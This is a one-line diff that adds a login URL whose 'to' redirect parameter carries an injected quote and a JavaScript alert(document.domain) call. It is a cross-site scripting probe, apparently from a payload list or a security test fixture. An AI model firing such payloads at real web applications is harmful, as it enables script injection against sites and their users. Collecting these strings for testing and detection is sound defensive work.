@@ -1,0 +1,1 @@
+/auth/login?to=/92874%27;alert(document.domain)//280
